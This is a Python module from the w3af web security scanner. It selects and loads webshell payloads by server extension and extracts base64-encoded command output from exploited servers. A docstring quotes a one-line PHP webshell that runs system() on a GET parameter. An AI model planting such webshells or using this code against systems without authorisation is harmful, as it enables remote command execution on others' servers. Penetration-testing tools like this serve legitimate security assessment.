'''
shell_handler.py

Copyright 2009 Andres Riancho

This file is part of w3af, http://w3af.org/ .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''
import os.path
import base64

import core.data.kb.knowledge_base as kb
from core.controllers.exceptions import w3afException

SHELL_IDENTIFIER_1 = '15825b40c6dace2a'[::-1]
SHELL_IDENTIFIER_2 = '7cf5d4ab8ed434d5'[::-1]
SHELL_IDENTIFIER = SHELL_IDENTIFIER_1 + SHELL_IDENTIFIER_2 


def get_webshells(extension, force_extension=False):
    '''
    This method returns a webshell content to be used in exploits, based on
    the extension, or based on the x-powered-by header.

    Plugins calling this function, should depend on "infrastructure.server_header"
    if they want to use the complete power if this function.
    '''
    return _get_file_list('webshell', extension, force_extension)


def get_shell_code(extension, force_extension=False):
    '''
    Like getShell, but instead of returning a list of the contents of a web shell,
    that you can upload to a server and execute, this method returns the CODE
    used to exploit an eval() vulnerability.

    Example:
        getShell() returns:
            "<?  system( $_GET['cmd'] )    ?>"

        get_shell_code() returns:
            "system( $_GET['cmd'] )"

    :return: The CODE of the web shell, suitable to use in an eval() exploit.
    '''
    return _get_file_list('code', extension, force_extension)


def extract_result(body):
    if SHELL_IDENTIFIER_1 not in body or SHELL_IDENTIFIER_2 not in body:
        msg = 'Unable to execute remote command, result extraction' \
              ' failed. Response body was "%s".' % body
        raise w3afException(msg)

    idx_1 = body.index(SHELL_IDENTIFIER_1)
    len_1 = len(SHELL_IDENTIFIER_1)
    idx_2 = body.index(SHELL_IDENTIFIER_2)
    raw_result = body[idx_1 + len_1:idx_2]
    
    try:
        result = base64.b64decode(raw_result)
    except TypeError:
        msg = 'Unexpected base64 decode error found while trying to retrieve'\
              ' the command output.'
        raise w3afException(msg)
     
    return result


def _get_file_list(type_of_list, extension, force_extension=False):
    '''
    :param type_of_list: Indicates what type of list to return, options:
        - code
        - webshell

    :return: A list with tuples of filename and extension for the webshells available in the
    webshells directory.
    '''
    known_framework = []
    uncertain_framework = []
    path = os.path.join('plugins', 'attack' , 'payloads', type_of_list)
    path += os.path.sep
    
    if force_extension:
        filename = path + type_of_list + '.' + extension
        real_extension = extension
        known_framework.append((filename, real_extension))
    else:
        powered_by_header_list = kb.kb.raw_read('server_header', 'powered_by_string')
        filename = ''

        file_list = [x for x in os.listdir(path) if x.startswith(type_of_list)]

        for shell_filename in file_list:

            filename = path + shell_filename
            real_extension = shell_filename.split('.')[1]
            
            # Just in case... this saves me from gedit and joe which save the
            # old files like code.php~
            if real_extension.endswith('~'):
                continue
            
            # Using the powered By headers
            # More than one header can have been sent by the server
            for h in powered_by_header_list:
                if h.lower().count(real_extension):
                    known_framework.append((filename, real_extension))

            # extension here is the parameter passed by the user, that can be ''
            # (this happens in dav)
            uncertain_framework.append((filename, real_extension))

    # We keep the order, first the ones we think could work, then the ones that may
    # work but... are just a long shot.
    known_framework.extend(uncertain_framework)
    
    res = []
    for filename, real_extension in known_framework:
        try:
            cmd_file = open(filename)
        except:
            raise w3afException('Failed to open filename: ' + filename)
        else:
            file_content = cmd_file.read()
            cmd_file.close()
            res.append((file_content, real_extension))

    return res
